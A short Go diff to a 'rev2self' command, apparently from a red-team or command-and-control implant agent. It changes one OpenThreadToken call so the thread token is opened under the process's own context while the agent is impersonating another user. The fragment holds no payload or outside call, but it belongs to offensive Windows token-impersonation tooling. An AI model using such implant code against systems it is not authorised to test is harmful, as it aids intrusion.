@@ -27,7 +27,7 @@ func (c *Rev2SelfCommand) Execute(task structs.Task) structs.CommandResult {
 	// Get current context before reverting
 	var beforeUsername, beforeDomain string
 	var threadToken windows.Token
-	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, false, &threadToken)
+	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &threadToken)
 	if err == nil {
 		// We have a thread token (impersonating)
 		defer threadToken.Close()
